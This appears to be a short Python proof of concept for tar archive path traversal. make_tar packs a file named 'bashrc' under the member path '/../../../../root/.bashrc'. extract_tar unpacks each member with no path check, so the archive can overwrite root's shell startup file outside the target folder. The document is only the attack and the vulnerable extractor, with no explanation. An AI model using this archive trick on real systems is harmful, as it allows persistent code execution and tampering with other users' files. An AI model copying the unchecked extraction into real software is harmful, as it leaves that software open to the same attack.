def extract_tar(file_path, dest_path):
    try:
        with tarfile.open(file_path, 'r') as src_file:
            for info in src_file.getmembers():
                src_file.extract(info.name, dest_path)
        return True
    except (IOError, OSError, tarfile.TarError):
        return False


def make_tar():
    tar_file=tarfile.open('x.tar.gz','w:gz')
    tar_file.add('bashrc', '/../../../../root/.bashrc')
    tar_file.list(verbose=True)
    tar_file.close()


if __name__ == '__main__':
    make_tar()
    extract_tar('x.tar.gz', 'xx')